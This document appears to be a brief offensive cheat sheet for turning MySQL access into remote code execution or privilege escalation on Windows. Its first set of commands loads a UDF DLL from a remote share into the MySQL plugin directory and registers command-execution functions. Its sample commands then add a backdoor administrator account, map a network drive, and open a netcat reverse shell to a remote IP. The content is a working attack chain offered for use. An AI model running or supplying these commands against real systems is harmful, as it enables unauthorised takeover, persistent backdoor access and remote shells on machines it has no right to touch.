# MySQL-to-RCE-or-PrivEsc
Setup for Windows

$ select @@plugin_dir;

$ select load_file('\\\\10.0.0.5\\share\\lib_mysqludf_sys_64.dll') into dumpfile "C:\\xampp\\mysql\\lib\\plugin\\udf.dll";

$ create function sys_bineval returns int soname 'udf.dll';

$ create function sys_eval returns string soname 'udf.dll';

$ select * from mysql.func where name = 'sys_bineval';

$ select * from mysql.func where name = 'sys_eval';



Execute Commands Samples for Windows

$ select sys_eval('dir C:\\Users\\4rch\\Desktop\\');

$ select sys_exec("net user 4rchantos Passwd1 /add");
$ select sys_exec("net localgroup Administrators 4rchantos /add");

$ select sys_eval("net use X: \\\\10.0.0.5\\share /user:user passwd");

$ select sys_eval("C:\\Users\\4rch\\Desktop\\nc.exe -e cmd.exe 192.168.49.125 80");

